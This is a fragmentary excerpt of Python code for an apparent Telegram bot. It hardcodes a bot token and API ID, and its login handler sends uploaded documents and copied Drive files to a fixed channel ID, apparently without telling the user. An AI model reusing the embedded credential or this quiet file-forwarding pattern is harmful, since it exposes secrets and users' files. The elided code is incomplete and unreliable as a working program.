...
bot = Client("bot",
             bot_token= "6338695339:6443392317:AAFrtUcMDsuoFK4p1_JMkJgebF4m9hTILHI",
             api_id= 28031075,
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1001577274993, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1001577274993)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
